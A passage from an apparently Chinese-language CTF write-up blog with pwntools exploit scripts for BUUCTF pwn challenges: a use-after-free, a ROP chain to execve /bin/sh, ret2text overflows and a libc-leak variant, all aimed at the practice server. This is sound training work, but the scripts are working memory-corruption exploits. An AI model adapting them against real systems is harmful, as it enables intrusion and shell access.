class=\"token comment\">#gdb.attach(p, 'b *0x08048A75')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x08048945</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Note size :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content :'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcont</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"jarvisoj_test_your_memory\"><a class=\"markdownIt-Anchor\" href=\"#jarvisoj_test_your_memory\">#</a> jarvisoj_test_your_memory</h2>\n<h2 id=\"cmcc_simplerop\"><a class=\"markdownIt-Anchor\" href=\"#cmcc_simplerop\">#</a> cmcc_simplerop</h2>\n<p>ropchain</p>\n<p>这题用 ROPgadget 秒解，但是需要进行修改，因为只能输入 100 个字符。</p>\n<p>没有遇 ‘\\0’ 截断的函数，所以可以把数字输入全部换成 pop 的形式。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> struct <span class=\"token keyword\">import</span> pack</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>r<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29465</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#r=process('./simplerop')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806e82a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080bae06</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'/bin'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0809a15d</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806e82a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea064</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 4</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080bae06</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'//sh'</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0809a15d</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806e850</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; pop ecx ; pop ebx ; ret</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080bae06</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0xb</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080493e1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># int 0x80</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"picoctf_2018_buffer_overflow_2\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_buffer_overflow_2\">#</a> PicoCTF_2018_buffer_overflow_2</h2>\n<p>ret2text</p>\n<p>需要注意后门函数两个参数必须为指定值才能输出 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29816</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./PicoCTF_2018_buffer_overflow_2')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x0080485CB</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main <span class=\"token operator\">=</span> <span class=\"token number\">0x0804866D</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x06c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0DEADBEEF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0DEADC0DE</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please enter your string: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"wustctf2020_getshell_2\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_getshell_2\">#</a> wustctf2020_getshell_2</h2>\n<p>ret2text</p>\n<p>这题的栈溢出只能溢出一个返回地址加 4 字节，所以如果按以往的方法只能放一个 gadget 和其返回地址。但如果用含 call 的汇编指令，返回地址由程序按正常方式放入，就可以做到放一个 gadget 和一个参数了。</p>\n<p>这题的字符串是一串乱码，但结尾是 sh，所以可以直接取 sh 的地址作 system 的参数。</p>\n<p><img data-src=\"./image-20230914211535334.png\" alt=\"image-20230914211535334\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27939</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_getshell_2')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b puts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x8048529</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sh <span class=\"token operator\">=</span> <span class=\"token number\">0x08048670</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\\\_\\\\ \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ps: 我有个神奇的思路，这道题没有开地址随机化，因此 libc 地址固定的，所以可以两次启动程序，第一次利用 call _puts 先泄露基地址然后找到 libc 中的 /bin/sh 字符串的地址，在第二次启动中使用。</p>\n<p>但是本地打通了，远程没成功。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27939</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_getshell_2')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b puts')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./wustctf2020_getshell_2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>puts_call <span class=\"token operator\">=</span> <span class=\"token number\">0x08048577</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload = b'a'*offset + p32(puts_call) + p32(lsm_g)</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>print('length: %x'%len(payload))</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p.recvuntil(b'\\\\_\\\\ \\n\\n')</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p.sendline(payload)</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lsm_a = u32(p.recv(4))</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p.close()</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p=remote('node4.buuoj.cn',27939)</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> <span class=\"token number\">0xf7df2540</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x8048529</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\\\_\\\\ \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20230914214946575.png\" alt=\"image-20230914214946575\"></p>\n<h2 id=\"bbys_tu_2016\"><a class=\"markdownIt-Anchor\" href=\"#bbys_tu_2016\">#</a> bbys_tu_2016</h2>\n<p>ret2text</p>\n<p>这垃圾 buu 系统不知道为啥我不先输入他什么都不显示。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28253</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./bbys_tu_2016')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b puts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x00804856D</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0c</span><span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#p.recvuntil('This program is hungry. You should feed it.')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"xdctf2015_pwn200\"><a class=\"markdownIt-Anchor\" href=\"#xdctf2015_pwn200\">#</a> xdctf2015_pwn200</h2>\n<p>ret2libc3</p>\n<h2 id=\"mrctf2020_easyoverflow\"><a class=\"markdownIt-Anchor\" href=\"#mrctf2020_easyoverflow\">#</a> mrctf2020_easyoverflow</h2>\n<p>考查栈的理解</p>\n<p>n0t_r3@11y_f1@g</p>\n<p>ju3t_@_f@k3_f1@g</p>\n<p>system (“/bin/sh”); 在主函数里，只要通过字符串比较即可执行。利用字符串溢出修改 v5 的值。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29368</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./mrctf2020_easyoverflow')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x030</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> <span class=\"token string\">b'n0t_r3@11y_f1@g'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token 